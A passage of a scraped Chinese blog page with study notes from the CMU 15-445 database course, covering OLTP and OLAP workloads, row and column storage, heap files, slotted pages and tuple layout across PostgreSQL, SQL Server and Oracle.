<h5 id="OLAP（On-line-Analytical-Processing"><a href="#OLAP（On-line-Analytical-Processing" class="headerlink" title="OLAP（On-line Analytical Processing)"></a>OLAP（On-line Analytical Processing)</h5><p>OLAP被称为联机分析处理，当我们从OLTP应用程序中收集到一大堆数据时，我们会想去分析它，并从中得到新的信息，这也被称为数据科学，即从已有的数据中派生处新的信息。</p>
<p>在这种情况下，我们不会去更新数据，它所要做的就是从已有的信息中为我们分析提供新的信息，我们会试着让这些信息变得有意义。</p>
<p>我们还是以上述的wikipedia为例子。</p>
<p><img src="http://119.23.248.105/%22wp-content/uploads%22/2020/05/LOCXWKSDB4PESV7PCX0.png"></p>
<p>这条SQL语句会去统计每个月里，主机名以.gov结尾的用户登陆数量。这种类型的查询就是只读的，它会去读取大量数据，例如扫描整张表。在OLTP（联机事务处理）中，我只会去更新一个东西，但是对于OLAP（联机分析处理）来说，我要去做大量的join，并读取大量的数据。</p>
<h5 id="OLTP与OLAP的对比"><a href="#OLTP与OLAP的对比" class="headerlink" title="OLTP与OLAP的对比"></a>OLTP与OLAP的对比</h5><p><img src="http://119.23.248.105/%22wp-content/uploads%22/2020/05/G6W_S2VGOO@GURKGHTKP.png"></p>
<p>上图可以粗略的表达不同workload的操作复杂度，可以看到，OLTP擅长简单的查询，但会做大量的写入操作；OLAP会做大量的读操作，并且它更复杂。图中我们还能看到一种新的workload，它被称为混合事务分析处理（HTAP），它试着将OLTP和OLAP混合在一起，既想要提取数据，又想在拿到数据时对它进行分析。</p>
<p>（Q1：OLAP和NoSQL或NewSQL系统间的关系是什么？（课堂内容）</p>
<p>A1：图上的这些（OLAP,OLTP,HTAP）是workload的类型，而NoSQL和NewSQL是DBMS系统类型。对于传统的NoSQL系统，MongoDB，Cassandra以及Redis来说，它们属于靠近OLTP那块，我们主要往它们塞入新数据。</p>
<p>NoSQL大约在2000年末时出现，许多公司为此投入大量资金，例如google，它们推出了HBase，BigTable和Hadoop，这些系统不去执行SQL，也不进行事务处理，更不会进行join操作，这就是它们能够扩展的原因。Hadoop具有在线分析处理的能力（OLAP），但像BigTable，Cassandra，MongoDB以及其他一些NoSQL数据库具备的则是OLTP联机事务处理的能力。</p>
<p>然后人们开始意识到他们想要处理事务的能力，想要SQL，也想去进行某些join操作，因此，NewSQL应运而生。他们想要实现的想法是，在不放弃事务的前提下，拥有快速处理事务的能力和OLTP。</p>
<p>)</p>
<h4 id="n-ary存储模型（行存储模型）"><a href="#n-ary存储模型（行存储模型）" class="headerlink" title="n-ary存储模型（行存储模型）"></a>n-ary存储模型（行存储模型）</h4><p>我们再次回到存储模型的主题上来，目前我们展示tuple时，我们总是以行的方式展现它。这被称<strong>n-ary存储模型</strong>，它的基本思路是将单个tuple的所有属性，连续的存储在同一个page中，对于体积较大的数据我们也可以使用overflow page，但基本思路都是一样的。</p>
<p>这是关于OLTP的一个想法，因为我们每次去访问的数据量在粒度上足够小（只访问少量tuple的全部属性），这样就能够访问单个实体，并拿到我的账户信息，我的订单信息，以及有关我账号的全部信息。我不需要关心其他几百万用户的信息，我只需要我自己的账号信息。如果它使用一行数据将我的账户信息连续存储，那么我的访问操作就非常的高效（相比column存储），我们只需要跳转到对应的page，并取到我想要的数据就结束了。</p>
<p><img src="http://119.23.248.105/%22wp-content/uploads%22/2020/05/BO0O2JTCANVOAO90.png"></p>
<p>上图是使用n-ary存储模型时，我们执行SQL查询时的流程。通过该SQL语句我想要根据用户名和账号拿到账号信息，我们可以通过索引来查找（后续介绍），得到tuple所在的page id和slot number，然后我们通过一次查找和读取，将page放入内存中，并跳转到对应偏移量得到我想要的数据。对于插入操作也是类似，只需要找到一个空的slot，并将数据一次性写入就行。</p>
<p>在这类请求下，将一个tuple的所有数据连续存储是读取数据时最高效的方式。</p>
<p>那么在什么情况下，行存储是低效的呢？</p>
<p><img src="http://119.23.248.105/%22wp-content/uploads%22/2020/05/E2R4NIZQ2@N_MVBGVU.png"></p>
<p>回头看看这条SQL语句（上面OLAP处提到过它的内容）。当我们执行这条SQL语句时，我们实际上要对整个用户账号表进行扫描，根据hostname来找到以.gov结尾的账号。</p>
<p>简单来说，我们只需要hostname和LastLogin这两个属性，就能够得到最终结果。由于行存储模式下，我们将一条tuple的全部属性连续存储在一起，且在非易失型存储设备中，我们每次读入读出都以page为单位，这两条限制导致我们可能会将其他不需要的属性一起读入内存（userId，userName，userPass）。可以看到我们读入了五个属性，但其中包含了三个没用的属性，当我们的数据量达到PB级别的话，这是非常低效的</p>
<p>总结一下行存储模型，在n-ary存储模型中（行存储模型），当我们访问<strong>整个tuple</strong>的时候，即插入，更新以及删除tuple时的速度很快。但如果我们要进行一些分析型的查询以及做些OLAP工作并且想要扫描整张表的大部分内容时，n-ary存储模型就十分废柴了，因为我们会向内存中读入一大堆我们不需要的数据。</p>
<p>为了解决n-ary存储模型所不能应对的情况，出现了column存储模型。</p>
<h4 id="column存储模型（列存储模型）"><a href="#column存储模型（列存储模型）" class="headerlink" title="column存储模型（列存储模型）"></a>column存储模型（列存储模型）</h4><p>在列存储模型中，我们不会将单个tuple的全部属性放在单个page上，而是将所有tuple的某个属性放在同一个page中，即将单个列的所有值连续保存在一起。这对于OLAP而言十分友好，我们可以读取表的部分属性集合，而不是像行存储模型一样将全部属性读出。</p>
<p><img src="http://119.23.248.105/%22wp-content/uploads%22/2020/05/QEYKSEYUL736A_STI7N5B.png"></p>
<p>回到上一个例子，这一次我们使用列存储模型。这一次我们只需将保存hostname的page放入内存中，并对每个hostname进行扫描匹配，这样我们就得到了能够匹配的tuple，接着把存储lastLogin的page读入内存，找到对应的lastLogin的值，最终生成输出结果。</p>
<p>可以看到这一次我们只需要读取2个page（存储hostname和lastLogin的page），就能够生成输出结果，而行存储则需要读取全部page，考虑在极端情况下，如果我有上亿个page，行存储模式的优越性就很明显。</p>
<h5 id="压缩数据"><a href="#压缩数据" class="headerlink" title="压缩数据"></a>压缩数据</h5><p>同时，列存储还有一个优点就是可压缩。对于行存储模型而言，不同属性对应的数据类型不同，在存储时，这些不同类型的数据被连续的存放在一起，显得十分散乱，我们难以直接分辨它们，所以对于行存储的压缩是较为困难的。</p>
<p>但对于列存储模型来说，一个page只会存放同一个属性的值，这些数据的类型显然是相同的，并且其中某些数据的值可能是相同的，那么我们就能够对它们进行压缩。</p>
<p>举例来说，我们要存储室内不同时间的温度，现在室内的温度是36度，一小时之后温度是36.1度，两小时后是36.2度，这些温度没有太多波动，我们无需完整的保存每次的温度数据，只需要将第一次记录的温度作为标准，然后记录每次新的温度和标准之间的差值即可，这样我们就能够保存较小的值。</p>
<p>对于原先只能存放1000个tuple的page，也许在进行了压缩之后，能够存放10000个数据。并且某些系统可以在未解压的情况下直接对数据进行操作，这就很美妙了…</p>
<h5 id="定位tuple的属性"><a href="#定位tuple的属性" class="headerlink" title="定位tuple的属性"></a>定位tuple的属性</h5><p>在列存储模式中，是否会将主键和每一个属性一起保存，即如何弄清某个hostname一开始是在哪一条tuple中？</p>
<p>我们有两种方法做这件事。</p>
<p><img src="http://119.23.248.105/%22wp-content/uploads%22/2020/05/NZRLABY__QWY50VNKC@T9E.png"></p>
<p><strong>Fixed-length Offsets</strong></p>
<p>第一种方案使用固定长度的偏移量，也就是说对于一列中的每个值而言，它的长度是固定的。</p>
<p>如上图，如果我们知道pageA中的一个属性x的偏移量d，该如何定位pageB中与x同属于一个tuple的属性y的偏移量D呢？</p>
<p>由于所有属性都是定长的，假设pageA中单个属性的长度为32位，而pageB中单个属性的类型为8位，那么我们首先确定x在A中的rowId（或者叫slot number，怎么命名取决于自己，但是不要和之前讲的那些弄混了）</p>
<p>rowId=d/32</p>
<p>然后就可以得到y在pageB中的偏移量D=indexA*8</p>
<p>经过很简单的计算就能够得到数据的位置。</p>
<p>但是如果遇上可变长类型怎么办？</p>
<p>我们可以将它压缩成一个定长的数据或是对可变长数据进行填充，让他的长度变成我们所允许的最大长度。</p>
<p>对于大多数系统而言，它们都使用Fixed-length Offsets的方法来定位tuple的属性。</p>
<p><strong>Embedded tuple id</strong></p>
<p>该方法中，我们为列中的每一个值都保存一个主键或是标识符，通过这个主键或是标识符来定位tuple的属性（上图右侧示例）</p>
<p>但这种方法是很糟糕的，因为我们要为每一个值额外花费32位或是64位的空间来保存它们的标识符，这是十分浪费的，所以大多数系统不使用这种方法。</p>
<p>总结一下列存储模型，对于列存储模型而言，它的优点是当我们进行OLAP查询时，可以显著降低无用I/O操作的数量，它不会读取我们不需要的page，借此提高系统的性能，并且它能够更好的支持压缩。但它的缺点也十分显著，由于我们将一个tuple的所有属性分开存储，当我们要读取或更新一条tuple时，就需要读取多个page，并将这些page中的属性拼接起来。</p>
<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>我们明白了，数据库的存储管理不应该完全独立于DBMS的其他部分，即对于DBMS的其他部分而言，存储管理不应该是个黑盒。当我们的数据库知道它要做什么，数据看起来是怎样的，它就能够更好的做出判断以及设计选择，并更加高效的执行查询操作。</p>
<p>另一方面，我们了解了OLTP和OLAP，在OLTP中，我们使用行存储，在OLAP中，我们使用列存储，简单的规则能够让我们的职业生涯更加轻松。</p>
<p>这两节课中，我们讨论了DBMS如何在磁盘上表示文件，下节课我们会讨论如何将数据放入内存，并对它们进行管理。</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-Hans">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/05/14/cmu15-445-%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AD%98%E5%82%A8part1/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/uploads/avatar.png">
      <meta itemprop="name" content="wwow">
      <meta itemprop="description" content="努力可能会成功，但不努力真的很舒服">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="wwow's blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2020/05/14/cmu15-445-%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AD%98%E5%82%A8part1/" class="post-title-link" itemprop="url">CMU15-445学习笔记-数据库存储part1</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2020-05-14 23:33:41" itemprop="dateCreated datePublished" datetime="2020-05-14T23:33:41+08:00">2020-05-14</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2020-08-30 12:03:57" itemprop="dateModified" datetime="2020-08-30T12:03:57+08:00">2020-08-30</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/cmu15-445/" itemprop="url" rel="index"><span itemprop="name">cmu15-445</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="Overview"><a href="#Overview" class="headerlink" title="Overview"></a>Overview</h2><p>第一节课中我们学到了从使用者的角度如何看待数据库，也学会了如何编写sql语句从数据库中读写数据，在后续的课程里我们将会学习如何构建一个数据库管理软件。</p>
<h2 id="面向磁盘型数据库系统"><a href="#面向磁盘型数据库系统" class="headerlink" title="面向磁盘型数据库系统"></a>面向磁盘型数据库系统</h2><p>每次我们要访问的数据都不在内存中，我们需要访问磁盘来得到我们需要的数据。在设计我们的软件时，需要设计一系列的组件来保护我们的系统。（有时会出现数据丢失，保存无效或错误数据等情况）</p>
<h3 id="易失型存储和非易失型存储"><a href="#易失型存储和非易失型存储" class="headerlink" title="易失型存储和非易失型存储"></a>易失型存储和非易失型存储</h3><p><img src="http://119.23.248.105/%22wp-content/uploads%22/2020/05/FB4MM@IF@2I_B9@MT1YHAM.png"></p>
<p>存储设备层次</p>
<p>图中虚线上方的存储设备属于易失型存储，而虚线下方的属于非易失型存储，不同存储设备的<strong>访问速度从上到下递减，容量大小从上到下递增</strong>。</p>
<p>当电源断开时，易失型存储中的数据将会消失，而不能持续的存在。对于存储在易失型存储中的数据，它支持快速随机访问，当以不同顺序访问不同位置的数据的延迟和速度都大致相同。它具有字节可寻址能力，即当我想读取64byte数据时，我也只得到64byte数据，也许大家觉得这理所当然，但是块可寻址的做法并不是这样。同时具有字节一般我们称DRAM中的东西为内存。</p>
<p>而易失型存储中的数据即使在断电后也能被持久性的保存。对于大部分非易失型存储（如磁盘），它一般支持的是顺序访问，这意味着访问不同位置的数据的延迟和速度会有差异，当读写一段连续的块中的内容时会更有效率，所以我们尽可能希望按序读取数据。另一方面，它不想DRAM一样具有字节可寻址能力，它具备的是块寻址能力，当我们要访问非易失型存储中的数据时，我们得到的一般是数据所在的块或页（可以看作是同一个东西），假如我们只想要64byte的数据，我们也不得不把整个大小为4KB的页读出来。</p>
<p>在数据库中，我们需要将数据从磁盘（非易失型存储）移动到内存（易失型存储）。</p>
<p>在图中的分割线处还有一类新的非易失型存储设备（e.g Intel傲腾内存），它像DRAM那样具有字节可寻址能力，又能够在断电后持久性保存数据。目前这种设备还未被大量使用，但是Andy认为它是数据库未来的方向。</p>
<p><img src="http://119.23.248.105/%22wp-content/uploads%22/2020/05/ZE1C6@BP4J342PH25Q.png"></p>
<p>可以看到不同设备的访问耗时有着巨大的差异，这意味着我们需要最小化从磁盘读取数据的影响，如果我们每次都要从磁盘读取数据，那么数据库的运行效率将十分惨淡。</p>
<h3 id="系统设计目标"><a href="#系统设计目标" class="headerlink" title="系统设计目标"></a>系统设计目标</h3><p>我们希望在数据库系统中达成的目标是给上层的应用程序一种<strong>错觉</strong>，即我们能够提供足够的内存将整个数据库存入内存中。即我们想要存储的数据库超出了可用内存的大小，但我们不必每次停下去读取或写入某些东西。</p>
<p>这几节课的内容就是关于如何最小化每次从磁盘读取内容或运行查询时所带来的影响（多线程，缓存，提前计算相关数据）。</p>
<h3 id="查询过程"><a href="#查询过程" class="headerlink" title="查询过程"></a>查询过程</h3><p><img src="http://119.23.248.105/%22wp-content/uploads%22/2020/05/UJE7ZS8Z5TT1UQZEUIBYQ.png"></p>
<p>上层的应用向buffer缓存池请求读取page2的内容，这时page2不在内存中，我们再从磁盘的page目录中查找到page2，并将其放入内存缓冲池中，再由buffer将page2的指针提交给上层</p>
<h3 id="为什么不使用OS"><a href="#为什么不使用OS" class="headerlink" title="为什么不使用OS"></a>为什么不使用OS</h3><p>这个过程像是操作系统中的虚拟内存的工作机制，我们为什么要在数据库中再做这样的内存管理呢？</p>
<p>在OS的术语中，我们可以使用mmap实现上述机制。如果我们使用OS来帮我们进行内存的管理，这就意味着我们放弃了对数据的直接控制权。OS不关心数据库的行为，它不知道数据库想要做什么，它只知道数据的读写，而不知道高层的语义。这会导致数据库需要使用更多的机制来提示OS的操作，但是我们始终无法完全控制OS完全按照我们的想法行动，这可能会导致许多性能瓶颈。</p>
<p>许多数据库都使用了mmap（levelDB,mongoDB，memSQL，SQLite），但它们大多数在发展过程中都逐渐摆脱了mmap，因为使用OS做内存管理会导致许多限制和性能瓶颈。（We known that Andy hate mmap）</p>
<p>而数据库明白查询的语义，它知道工作负载如何，它能够根据这些做出最佳选择，但OS不知道这些，它只知道一些底层的读写调用。OS就像一辆通用卡车，但我们能够像保时捷法拉利那样调整我们的系统，来做到更好的定制化，</p>
<h3 id="如何用磁盘上的文件表示数据库"><a href="#如何用磁盘上的文件表示数据库" class="headerlink" title="如何用磁盘上的文件表示数据库"></a>如何用磁盘上的文件表示数据库</h3><h3 id="如何将页存储在文件中"><a href="#如何将页存储在文件中" class="headerlink" title="如何将页存储在文件中"></a>如何将页存储在文件中</h3><p>数据库就是磁盘上的一堆文件。对于OS而言，它不知道这里面有什么，这只是一堆普通的二进制文件。但是这些数据文件的格式通常都是专用于某个数据库管理系统的，我们无法将SQLite文件导入mySQL中，反之亦然。</p>
<p>我们通常将文件存放在OS提供的文件系统中（Ex3，Ex4），我们使用文件系统的读写API对文件进行读写（提高数据库的可移植性和降低开发复杂度）。</p>
<h4 id="存储管理器"><a href="#存储管理器" class="headerlink" title="存储管理器"></a>存储管理器</h4><p>我们的课程lab将会构建一个存储管理器（存储引擎），它负责维护磁盘上的数据库文件，我们将这些文件组织为一个page的集合，我们的存储管理器将会跟踪在这些page上的所有读写操作。</p>
<h4 id="数据库page"><a href="#数据库page" class="headerlink" title="数据库page"></a>数据库page</h4><p>一个page就是一个固定大小的数据块，我们将文件组织为这些块，它能够存储各种东西（数据，索引，日志，元数据），但是有些数据库要求page必须是self-contained的，即page中的所有信息你都需要知道如何去理解和解释。</p>
<p>举例说，我有一张表，我将表的元数据存入一个page，而表的所有tuple存入另一个page，但是现在磁盘烧了，存储元数据的那个page丢失了，那么我就无法解释存储tuple的那个page，我们不知道这里面的数据是什么。所以我们应该将元数据和tuple应该存放在一起，这样就满足了self-contained。</p>
<p>所以self-contained特性能够保证即使丢失了一个page，也不会影响其他page，许多系统通过它来进行容灾恢复。</p>
<p>每个page会被赋予一个唯一的内部标识符，我们会有一个indirection层来将一个pageID映射到集合中一个文件的某个位置（记录一个相对位置，当文件整体移动后，我们只需要知道文件的起始位置，就可以通过pageID得到数据对应的位置，因为页的大小是固定的，id*页的大小就能够得到offset）</p>
<p>我们需要明确数据库中讲的page和OS以及硬件层的page不完全相同。</p>
<p>对于硬件层和OS来说，一个page的大小一般为4KB，但数据库中page的大小是可调整的（512B~16KB），需要注意的是由于硬件层的page大小为4KB，这意味这当我对磁盘进行写入和刷新时，存储设备只能保证每次写入4KB时原子性的。</p>
<p>这就容易造成一个问题 例如我们将一个16KB的数据库page回写到磁盘 但是OS在写入前8KB后故障了 这个时候它并不会回滚，它只会继续把剩下8kb继续写入磁盘，这样会导致这16kb的数据被分裂成两部分，我们就不能使用了</p>
<h4 id="page存储架构"><a href="#page存储架构" class="headerlink" title="page存储架构"></a>page存储架构</h4><p>不同DBMS使用不同的方式管理磁盘上的page</p>
<h5 id="Heap-file-organization"><a href="#Heap-file-organization" class="headerlink" title="Heap file organization"></a>Heap file organization</h5><p>数据库中的heap文件是一个page的<strong>无序</strong>集合，即随机地把tuple存在其中，当我们将tuple一个接一个地插入，不能保证在磁盘的顺序和插入的顺序相同。</p>
<p>我们需要使用一些元数据来跟踪page，知道哪些page是空闲的，这样我们就可以将数据插入到空闲的page中。</p>
<p>我们可以通过不同的方式表示heap文件。</p>
<p>1.链表</p>
<p>我们需要在heap文件的头部中维护两个链表，一个是指向空闲page的链表，另一个是指向已保存数据page的链表。每次我们要插入数据的时候就在空闲page的链表中遍历查找一个大小合适的page来保存插入的数据。</p>
<p><img src="http://119.23.248.105/%22wp-content/uploads%22/2020/05/KA0E_UOHB74O8W6U.png"></p>
<p>2.page目录</p>
<p>page目录一样存放在heap文件的头部中，它里面维护了pageID和它们位置的映射关系，我们也可以在其中维护一些额外的元信息，例如每个page的空闲空间，当我想要插入一些数据的时候，我们就可以在page字典中查找到对应的page存放数据。</p>
<p>（类似hash Table）</p>
<p><img src="http://119.23.248.105/%22wp-content/uploads%22/2020/05/2IJNNGPAORYUWO96.png"></p>
<p>page目录</p>
<p>这时我们会遇到一些关于原子性操作的问题，当我们删除了一些数据和page，我们也需要修改page目录中的信息，表示这个page现在有空闲的空间了。但是这个过程不能保证是原子性的，有可能在我们修改page目录中的信息前，系统崩溃了，当系统恢复正常时，page目录中仍显示哪些我们已经删除数据的page是满的，但实际上它已经变成空闲的了。</p>
<p>也许我们可以在系统恢复后，对所有page进行一次扫描并更新对应的page目录信息。但在数据库中信息量非常大的情况（1PB），这个工作就显得不太可能完成。</p>
<p>我们后续会讨论采用一些机制来维护日志和初始的元数据，在系统崩溃后，我们仍然可以正确的恢复它。</p>
<p>（Q1：为什么数据库的page大小要设置的比OS和硬件层更大？</p>
<p>A1：这是一种权衡，在数据库内部，我们使用内存中的page目录来映射page的位置。如果我们使用更大的page，那么我们使用的pageID就更少，相应的page目录就更小，类似CPU中的TLB（页表缓存）；如果page设置的小，那么page目录就会变得很大，那么它就难以存放在高速缓存或是内存中。</p>
<p>我们可以讨论一下随机访问和顺序访问的问题，如果我们的数据库page是16KB，我们可以连续写出4个4KB的page（OS意义的page）来表示它，这其实一定程度上用到了顺序访问的特点。但是我们在写入的时候也需要增加许多机制来防止由于原子性导致的数据错误。所以不同的做法各有优缺点，这也是许多商业数据库允许你根据自己的需要调整数据库的原因。）</p>
<p>（Q2：如果使用self-contained page，是否能够解决上述的原子性问题？</p>
<p>A2：不行，因为对于self-contained page，它只是表示元数据和tuple放在同一个数据page中。我们在修改数据时，一定需要做修改数据page和修改目录page这两步操作，原子性的问题并没有解决。）</p>
<h5 id="page头部"><a href="#page头部" class="headerlink" title="page头部"></a>page头部</h5><p>每一个page中都有一个包含元数据的头部，头部中的数据一般包括：</p>
<p>1.page大小</p>
<p>2.Checksum（使用CRC,md5来检验出错）</p>
<p>3.数据库管理系统版本</p>
<p>4.transaction visibility（目前不太了解，就不翻译了)</p>
<p>5.compression information（同上）</p>
<h5 id="page布局"><a href="#page布局" class="headerlink" title="page布局"></a>page布局</h5><p>对于任何page存储架构，我们需要理解如何在page内部存储和组织数据</p>
<p>我们可以通过两种方式表示一个page中的数据：(我们假设目前只存储tuple)</p>
<p>1.Tuple-oriented；2.log-structured</p>
<p>我们现在来看一看page内部是怎样的。</p>
<p><strong>Tuple-oriented</strong></p>
<p>首先来看一看最简单的一种做法</p>
<p><img src="http://119.23.248.105/%22wp-content/uploads%22/2020/05/KH93RO3Z2AECQ.png"></p>
<p>我们在page的头部中记录一个TupleNum，它表示目前存储的tuple的数量，每次插入一个新的tuple，我们就根据TupleNum来计算偏移量，将新的tuple插入到最后。</p>
<p>但是这么做很蠢，因为当我们要在中间删除一个tuple的时候，我们要将在它之后的大量tuple都向前移。</p>
<p>也许我们可以不必移动后面的tuple，而是将新的tuple插入到这个空位就行了，但这仍然不好，因为我们要存储的tuple可能是不定长的，可能这个空位不够大，无法容纳新的tuple。另一方面，这种做法要求我们在头部维护一个空位信息来告诉新插入的tuple，哪些位置是空位。</p>
<p>我们介绍一种更加通用的page存储策略：<strong>slotted page</strong></p>
<p><img src="http://119.23.248.105/%22wp-content/uploads%22/2020/05/SGCPRH17CE_L1WE14FB7V.png"></p>
<p>首先在page的头部保存一些基本的元数据（checksum，访问时间等），并且我们有一个slot数组，它将一个特定的slot映射到page内的一个偏移量。而数据存储部分则在page的最后部分。我们可以通过查找slot数组来得到tuple的偏移量，并进一步查找得到数据。当tuple移动时，只需要更新slot数组的对应值就行。这样，当我们要查找一条tuple时，我们可以使用pageID和slot number来定位它。</p>
<p>我们填充page的方式是从前往后对slot数组进行填充，而数据则是从后向前填充（如图所示，对于tuple1而言，我们从page结束位置开始，减去tuple1的大小，这样就得到了tuple1的起始偏移量，并将它存到slot数组中），当我们的数据占用了page的一半大小时，将认为这个page已满，这样可能会留下一些空隙，但我们为了支持可变大小的tuple，不得不这么做。</p>
<p>（Q3：我怎么知道tuple1是存在slot1中的？</p>
<p>A3：我们识别tuple的方式是使用tupleId或recordId，它是一个用来表示一个tuple的逻辑地址，一般是由pageId加上offset或是slot来表示。</p>
<p>Andy分别使用PostgreSQL，SQLite，Oracle来展示不同的数据库如何定位一个tuple。</p>
<p><img src="http://119.23.248.105/%22wp-content/uploads%22/2020/05/2HTVS72D7C7ZQIIH8.png"></p>
<p><strong>首先是PostgreSQL的例子</strong>，它使用属性ctid来定位不同tuple，（0，1）表示该tuple位于page0，slot1的位置</p>
<p>当我们删除id=102的tuple后得到下图的结果。</p>
<p><img src="http://119.23.248.105/%22wp-content/uploads%22/2020/05/U02JAYPV953_PDTWO@@9.png"></p>
<p>可以看到slot2被清空了，那么考虑一下如果这时我们再插入新的tuple，新的tuple会放在slot2还是slot4？</p>
<p><img src="http://119.23.248.105/%22wp-content/uploads%22/2020/05/JEAMUWX338_T0J8BIPN.png"></p>
<p>答案是新的tuple会放在slot4（这只是代表PostgreSQL的做法）</p>
<p>在PostgreSQL中有一个类似于GC的东西，叫做vaccum，它会遍历所有page，并对它们进行整理，当它发现空闲空间，它会对这些page进行压缩。</p>
<p><img src="http://119.23.248.105/%22wp-content/uploads%22/2020/05/8ENM9Z_4LQ2L7_PK.png"></p>
<p>这是我们执行vaccum后的结果，可以看到id=103的tuple被移动到slot2的空位上，后面的id=104的tuple也向前紧凑。</p>
<p><strong>接下来看看在SQL server中是如何定位一个tuple</strong></p>
<p><img src="http://119.23.248.105/%22wp-content/uploads%22/2020/05/TUNN@0JKOELI8JGP.png"></p>
<p>SQL中使用File：Page：Slot这个属性清晰的告诉我们tuple的位置。</p>
<p>然后我们将第二条tuple删去，得到下图的结果。</p>
<p><img src="http://119.23.248.105/%22wp-content/uploads%22/2020/05/NPRF6TCDA72@NH8U.png"></p>
<p>再插入一条新的tuple看看，对于SQL server而言，它会将新的tuple放在哪个Slot。</p>
<p><img src="http://119.23.248.105/%22wp-content/uploads%22/2020/05/LM11OC61@NJRMEAWKI.png"></p>
<p>从上图中看到，SQL server在更新pserverage时，它一旦发现了page中存在可用的空隙，那么它会将page做紧凑处理，然后再将数据写出到page上。所以我们会看到id=103的tuple从slot2被移动到slot1，而新插入的id=104的tuple被放在slot2。</p>
<p><strong>最后我们看看Oracle的做法</strong></p>
<p><img src="http://119.23.248.105/%22wp-content/uploads%22/2020/05/RFVXX_R6REBF5ZFZX95M.png"></p>
<p>Oracle使用rowID来定位tuple，但是显然rowID的数据我们看不懂，我们可以添加命令对他进行翻译，得到OBJID,FILENUM,BLOCKNUM,ROWSLOT这几项属性。</p>
<p>同样的，我们删去ID=102的tuple。</p>
<p><img src="http://119.23.248.105/%22wp-content/uploads%22/2020/05/2KDGZA5CZZTWAXS3E.png"></p>
<p>最后插入一条ID=104的tuple。</p>
<p><img src="http://119.23.248.105/%22wp-content/uploads%22/2020/05/1P@DX88OO1QEV8@XH.png"></p>
<p>结果和PostgreSQL相似，新插入的tuple被放在了Slot3上，而不是存在空位的Slot1。</p>
<p>上面三个例子是不同数据库表示内部tuple的方法，SQL server会在我们写入数据时进行压缩，而PostgreSQL和Oracle则是把空的slot放在那里不管它。不同的数据库系统做不同的事情，这只是系统内部组织page的tuple的方法，它并不会影响系统的其他部分。</p>
<p>）</p>
<h3 id="页中的tuple是怎样的"><a href="#页中的tuple是怎样的" class="headerlink" title="页中的tuple是怎样的"></a>页中的tuple是怎样的</h3><h3 id="tuple布局"><a href="#tuple布局" class="headerlink" title="tuple布局"></a>tuple布局</h3><p>对我们而言，tuple是一串字节，当我们取得了slot偏移量，我们向对应的位置写入一些字节，这就足够了。</p>
<p>但对于数据库而言，它需要能够解释这一串字节的实际含义。这也是我们需要有scheme的原因，scheme会记录不同属性的类型，这样我们可以知道tuple的大小，并进一步跳转到不同的偏移量处得到我想要的tuple。</p>
<p><img src="http://119.23.248.105/%22wp-content/uploads%22/2020/05/YEHLKACVXJ11GW2S7UV.png"></p>
<p>上图是tuple的结构，在一个tuple内我们也需要一个头部来追踪不同的信息，例如哪一个事务查询修改了它，以及null值的位图。</p>
<p>通常情况下，我们不需要将tuple的元数据（这个tuple有几列，不同属性的类型等）保存在tuple内部。我们将这些高级的元数据保存在这个page里（整个page都存储同一个表的tuple）。</p>
<p>但是对于支持JSON和scheme的数据库（MongoDB），我们需要将元数据写在tuple内部，因为每一条tuple和记录都可能不同，所以我们要保存与其实际内容相关的元数据。</p>
<h4 id="不同表的数据保存在同一个page"><a href="#不同表的数据保存在同一个page" class="headerlink" title="不同表的数据保存在同一个page"></a>不同表的数据保存在同一个page</h4><p>大多数情况下，我们为了让page变得独立，我们不会想将不同表的tuple保存在同一个page中，这样我们不得不保存一大堆属于不同表的元数据。</p>
<p>在某些情况下，我们希望将一张表嵌入另一张表中，我们会使用join操作将不同的表进行内联，这时，我们可以将不同表的数据放在同一个page中。</p>
<p>举例来说，如下图所示，我们有foo和bar两个table，它们使用一个外键相关联。</p>
<p><img src="http://119.23.248.105/%22wp-content/uploads%22/2020/05/1O01UGBX9N_HWDP5.png"></p>
<p>通常情况下，我们会将这两张表分开保存在不同page中（如下图）</p>
<p><img src="http://119.23.248.105/%22wp-content/uploads%22/2020/05/W2I7QUN@CUPCFD8KB.png"></p>
<p>但是当我们想将两张表进行join操作时，我们会将bar的tuple直接内嵌在foo的tuple中，这样它们就被存放在同一个page中。（如下图）</p>
<p><img src="http://119.23.248.105/%22wp-content/uploads%22/2020/05/OE43Y5@M8XC59V0FJIHY.png"></p>
<p>这被称为反范式化，在内部我们会以这样的方式存储我们的page，在应用程序看来，它里面有两张相同的表，但在内部，我们的page实际上将它们合并到一起了。</p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>数据库是通过page组织数据的</p>
<p>我们使用不同的方式来跟踪文件中的page</p>
<p>我们使用不同方式来存储page</p>
<p>在page中，我们可以用不同的方式存储tuple</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-Hans">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/04/18/mit-6-824-lab4b-sharded-key-value-server/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/uploads/avatar.png">
      <meta itemprop="name" content="wwow">
